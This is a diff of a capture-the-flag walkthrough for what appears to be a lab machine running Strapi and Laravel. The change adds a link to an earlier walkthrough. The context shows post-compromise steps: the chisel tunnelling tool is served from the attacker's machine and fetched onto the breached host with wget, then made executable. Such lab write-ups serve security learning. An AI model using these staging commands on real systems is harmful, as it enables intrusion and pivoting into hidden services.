@@ -365,7 +365,7 @@ I tried with a few different usernames and passwords, to no avail... We have to 
 curl 127.0.0.1:8000
 `````
 
-The output is lengthy and messy, but there are a lot of references to laravel (*"Laravel is a web application framework with expressive, elegant syntax"*). In the last box I did, I used a tool for the first time called *chisel* to access a database that was running in a container on the compromised host. For the sake of the exercise, let's try to use it again here to display the page on the host.\\
+The output is lengthy and messy, but there are a lot of references to laravel (*"Laravel is a web application framework with expressive, elegant syntax"*). In the last box I did (<a href="/_walkthroughs/Devzat">Devzat</a>), I used a tool for the first time called *chisel* to access a database that was running in a container on the compromised host. For the sake of the exercise, let's try to use it again here to display the page on the host.\\
 First, we have to upload *chisel* on the compromised host. To do so, we start a python web server on Kali (*sudo python -m SimpleHTTPServer* in the directory in which we have *chisel*), and *wget* (*wget http://10.10.14.9:8000/chisel*) it from *strapi*. On *strapi*, I created a *.tmp* directory in */tmp* to download it. Finally, we make it executable with *chmod +x chisel*.
 
 Then, we run the following command on Kali:
